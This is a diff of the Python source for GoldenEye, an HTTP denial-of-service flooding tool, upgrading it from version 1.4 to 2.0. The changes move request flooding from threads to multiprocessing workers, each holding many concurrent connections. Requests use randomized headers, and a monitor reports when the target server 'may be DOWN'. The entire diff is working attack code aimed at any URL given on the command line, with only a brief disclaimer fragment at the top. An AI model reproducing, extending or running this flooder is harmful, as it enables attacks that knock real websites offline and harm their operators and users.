@@ -25,8 +25,8 @@ and any malicious usage of this tool is prohibited.
 
 @author Jan Seidl <http://wroot.org/>
 
-@date 2012-05-31
-@version 1.4
+@date 2012-12-09
+@version 2.0
 
 @TODO Test in python 3.x
 
@@ -40,7 +40,8 @@ THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
 BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
 """
 
-import threading, urlparse, ssl
+from multiprocessing import Process, Manager
+import urlparse, ssl
 import sys, getopt, random, time
 
 # Python version-specific 
@@ -65,6 +66,11 @@ METHOD_GET  = 'get'
 METHOD_POST = 'post'
 METHOD_RAND = 'random'
 
+JOIN_TIMEOUT=1.0
+
+DEFAULT_WORKERS=50
+DEFAULT_SOCKETS=30
+
 ####
 # GoldenEye Class
 ####
@@ -72,26 +78,31 @@ METHOD_RAND = 'random'
 class GoldenEye(object):
 
     # Counters
-    request_counter=0
-    last_request_counter=0
-    failed_counter=0
-    last_failed_counter=0
+    counter = [0, 0]
+    last_counter = [0, 0]
 
     # Containers
-    threadsQueue = []
+    workersQueue = []
+    manager = None
 
     # Properties
     url = None
 
     # Options
-    nr_threads = 500
+    nr_workers = DEFAULT_WORKERS
+    nr_sockets = DEFAULT_SOCKETS
     method = METHOD_GET
-    unstoppable = False
 
     def __init__(self, url):
 
         # Set URL
         self.url = url
+
+        # Initialize Manager
+        self.manager = Manager()
+
+        # Initialize Counters
+        self.counter = self.manager.list((0, 0))
 
     def exit(self):
         self.stats()
@@ -109,63 +120,74 @@ class GoldenEye(object):
     def fire(self):
 
         self.printHeader()
-        print "Hitting webserver in mode {0} with {1} threads".format(self.method, self.nr_threads)
+        print "Hitting webserver in mode {0} with {1} workers running {2} connections each".format(self.method, self.nr_workers, self.nr_sockets)
 
         if DEBUG:
-            print "Starting {0} concurrent Laser threads".format(self.nr_threads)
+            print "Starting {0} concurrent Laser workers".format(self.nr_workers)
 
-        # Start threads
-        for i in range(int(self.nr_threads)):
+        # Start workers
+        for i in range(int(self.nr_workers)):
 
-            thread = Punch(self.url)
-            thread.method = self.method
-            thread.unstoppable = self.unstoppable
+            try:
 
-            self.threadsQueue.append(thread)
-            thread.start()
+                worker = Laser(self.url, self.nr_sockets, self.counter)
+                worker.method = self.method
+
+                self.workersQueue.append(worker)
+                worker.start()
+            except (Exception):
+                error("Failed to start worker {0}".format(i))
+                pass 
 
         print "Initiating monitor"
         self.monitor()
 
     def stats(self):
-        if self.request_counter > 0 or self.failed_counter > 0:
 
-            print "{0} GoldenEye punches deferred. ({1} Failed)".format(self.request_counter, self.failed_counter)
+        try:
+            if self.counter[0] > 0 or self.counter[1] > 0:
 
-            if self.request_counter > 0 and self.failed_counter > 0 and self.last_request_counter == self.request_counter and self.failed_counter > self.last_failed_counter:
-                print "\tServer may be DOWN!"
+                print "{0} GoldenEye punches deferred. ({1} Failed)".format(self.counter[0], self.counter[1])
 
-            self.last_request_counter = self.request_counter
-            self.last_failed_counter = self.failed_counter
+                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
+                    print "\tServer may be DOWN!"
+    
+                self.last_counter[0] = self.counter[0]
+                self.last_counter[1] = self.counter[1]
+        except (Exception):
+            pass # silently ignore
 
     def monitor(self):
-        while len(self.threadsQueue) > 0:
+        while len(self.workersQueue) > 0:
             try:
-                for thread in self.threadsQueue:
-                    if thread is not None and thread.isAlive():
-                        self.request_counter += thread.currentCounter()
-                        self.failed_counter += thread.currentFailedCounter()
-                        thread.join(.1)
+                for worker in self.workersQueue:
+                    if worker is not None and worker.is_alive():
+                        worker.join(JOIN_TIMEOUT)
                     else:
-                        self.threadsQueue.remove(thread)
+                        self.workersQueue.remove(worker)
 
                 self.stats()
 
             except (KeyboardInterrupt, SystemExit):
-                print "CTRL+C received. Killing all threads"
-                for thread in self.threadsQueue:
+                print "CTRL+C received. Killing all workers"
+                for worker in self.workersQueue:
                     try:
                         if DEBUG:
-                            print "Killing thread {0}".format(thread.getName())
-                        thread.stop()
+                            print "Killing worker {0}".format(worker.name)
+                        #worker.terminate()
+                        worker.stop()
                     except Exception, ex:
                         pass # silently ignore
+                if DEBUG:
+                    raise
+                else:
+                    pass
 
 ####
-# Punch Class
+# Laser Class
 ####
 
-class Punch(threading.Thread):
+class Laser(Process):
 
         
     # Counters
@@ -179,30 +201,36 @@ class Punch(threading.Thread):
     ssl = False
     referers = []
     useragents = []
+    socks = []
+    counter = None
+    nr_socks = DEFAULT_SOCKETS
 
     # Flags
     runnable = True
 
     # Options
     method = METHOD_GET
-    unstoppable = False
 
-    def __init__(self, url):
+    def __init__(self, url, nr_sockets, counter):
 
-        super(Punch, self).__init__()
+        super(Laser, self).__init__()
+
+        self.counter = counter
+        self.nr_socks = nr_sockets
 
         parsedUrl = urlparse.urlparse(url)
 
         if parsedUrl.scheme == 'https':
             self.ssl = True
 
-        self.host = parsedUrl.netloc
+        self.host = parsedUrl.netloc.split(':')[0]
         self.url = parsedUrl.path
 
         self.port = parsedUrl.port
 
         if not self.port:
             self.port = 80 if not self.ssl else 443
+
 
         self.referers = [ 
             'http://www.google.com/?q=',
@@ -231,21 +259,6 @@ class Punch(threading.Thread):
         self.stop()
 
 
-    def run(self):
-
-        try:
-
-            if DEBUG:
-                print "Starting thread {0}".format(self.getName())
-
-            self.attack()
-
-            if DEBUG:
-                print "Thread {0} completed run. Sleeping...".format(self.getName())
-
-        except:
-            raise
-
     #builds random ascii string
     def buildblock(self, size):
         out_str = ''
@@ -263,36 +276,56 @@ class Punch(threading.Thread):
         return out_str
 
 
-    def attack(self):
+    def run(self):
+
+        if DEBUG:
+            print "Starting worker {0}".format(self.name)
 
         while self.runnable:
 
             try:
 
-                if self.ssl:
-                    c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
-                else:
-                    c = HTTPCLIENT.HTTPConnection(self.host, self.port)
+                for i in range(self.nr_socks):
+                
+                    if self.ssl:
+                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
+                    else:
+                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)
 
-                (url, headers) = self.createPayload()
+                    self.socks.append(c)
 
-                method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
+                for conn_req in self.socks:
 
-                c.request(method.upper(), url, None, headers)
+                    (url, headers) = self.createPayload()
 
-                resp = c.getresponse()
+                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
 
-                self.incCounter()
+                    conn_req.request(method.upper(), url, None, headers)
+
+                for conn_resp in self.socks:
+
+                    resp = conn_resp.getresponse()
+                    self.incCounter()
+
+                self.closeConnections()
+                
             except:
                 self.incFailed()
                 if DEBUG:
                     raise
                 else:
                     pass # silently ignore
-            else:
-                if c:
-                    c.close()
 
+        if DEBUG:
+            print "Worker {0} completed run. Sleeping...".format(self.name)
+            
+    def closeConnections(self):
+        for conn in self.socks:
+            try:
+                conn.close()
+            except:
+                pass # silently ignore
+            
 
     def createPayload(self):
 
@@ -392,27 +425,23 @@ class Punch(threading.Thread):
     # Housekeeping
     def stop(self):
         self.runnable = False
-        self._Thread__stop()
+        self.closeConnections()
+        self.terminate()
 
     # Counter Functions
     def incCounter(self):
-        self.request_count += 1
+        try:
+            self.counter[0] += 1
+        except (Exception):
+            pass
 
     def incFailed(self):
-        self.failed_count += 1
+        try:
+            self.counter[1] += 1
+        except (Exception):
+            pass
+        
 
-    def currentCounter(self, reset=True):
-        currentCount = self.request_count
-        if reset:
-            self.request_count = 0
-        return currentCount
-        
-    def currentFailedCounter(self, reset=True):
-        currentCount = self.failed_count
-        if reset:
-            self.failed_count = 0
-        return currentCount
-        
 
 ####
 
@@ -427,8 +456,9 @@ def usage():
     print
     print ' OPTIONS:'
     print '\t Flag\t\t\tDescription\t\t\t\t\t\tDefault'
-    print '\t -t, --threads\t\tNumber of concurrent threads\t\t\t\t(default: 500)'
-    print '\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t\t(default: get)'
+    print '\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS)
+    print '\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS)
+    print '\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)'
     print '\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)'
     print '\t -h, --help\t\tShows this help'
     print '-----------------------------------------------------------------------------------------------------------'
@@ -451,21 +481,32 @@ def main():
         if len(sys.argv) < 2:
             error('Please supply at least the URL')
 
-        opts, args = getopt.getopt(sys.argv[2:], "dht:m:u", ["debug", "help", "threads", "method", "unstoppable" ])
-
-        threads = 500
         url = sys.argv[1]
+
+        if url == '-h':
+            usage()
+            sys.exit()
+
+        if url[0:4].lower() != 'http':
+            error("Invalid URL supplied")
+
+        if url == None:
+            error("No URL supplied")
+
+        opts, args = getopt.getopt(sys.argv[2:], "dhw:s:m:", ["debug", "help", "workers", "sockets", "method" ])
+
+        workers = DEFAULT_WORKERS
+        socks = DEFAULT_SOCKETS
         method = METHOD_GET
-        unstoppable = False
 
         for o, a in opts:
             if o in ("-h", "--help"):
                 usage()
                 sys.exit()
-            elif o in ("-u", "--unstoppable"):
-                unstoppable = True
-            elif o in ("-t", "--threads"):
-                threads = int(a)
+            elif o in ("-s", "--sockets"):
+                socks = int(a)
+            elif o in ("-w", "--workers"):
+                workers = int(a)
             elif o in ("-d", "--debug"):
                 global DEBUG
                 DEBUG = True
@@ -477,13 +518,10 @@ def main():
             else:
                 error("option '"+o+"' doesn't exists")
 
-        if url == None:
-                error("No URL supplied")
-
         goldeneye = GoldenEye(url)
-        goldeneye.nr_threads = threads
+        goldeneye.nr_workers = workers
         goldeneye.method = method
-        goldeneye.unstoppable = unstoppable
+        goldeneye.nr_sockets = socks
 
         goldeneye.fire()
 
